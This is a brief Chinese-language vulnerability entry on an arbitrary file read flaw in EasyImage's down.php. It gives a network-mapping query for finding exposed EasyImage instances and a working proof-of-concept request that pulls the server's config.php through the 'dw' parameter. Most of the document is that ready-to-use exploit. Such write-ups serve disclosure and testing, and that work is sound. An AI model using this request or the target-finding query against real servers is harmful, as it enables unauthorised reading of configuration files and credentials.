# EasyImage down.php 任意文件读取漏洞

## 漏洞描述

EasyImage down.php 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件

## 漏洞影响

```
EasyImage
```

## 网络测绘

```
app="EasyImage-简单图床"
```

## 漏洞复现

主页面

![image-20230417094057151](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326114014893.png)

验证POC

```
/application/down.php?dw=./config/config.php
```

![image-20230417094115549](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326114014895.png)